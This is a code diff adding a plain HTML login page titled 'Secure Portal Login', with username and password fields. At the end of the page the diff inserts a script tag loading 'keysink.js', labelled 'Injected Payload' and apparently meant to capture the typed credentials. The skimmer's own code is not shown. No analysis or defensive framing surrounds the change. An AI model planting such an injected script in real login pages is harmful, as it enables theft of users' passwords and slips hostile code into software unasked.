@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Portal Login</title>
+  <style>
+    body { font-family: sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    form { background: white; padding: 2em; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    input { display: block; width: 100%; margin-bottom: 1em; padding: 0.5em; }
+  </style>
+</head>
+<body>
+  <form>
+    <h2>Company Login</h2>
+    <input type="text" placeholder="Username" autocomplete="off">
+    <input type="password" placeholder="Password" autocomplete="off">
+    <button type="submit">Login</button>
+  </form>
+
+  <!-- Injected Payload -->
+  <script src="keysink.js"></script>
+ <!-- This line is key -->
+</body>
+</html>
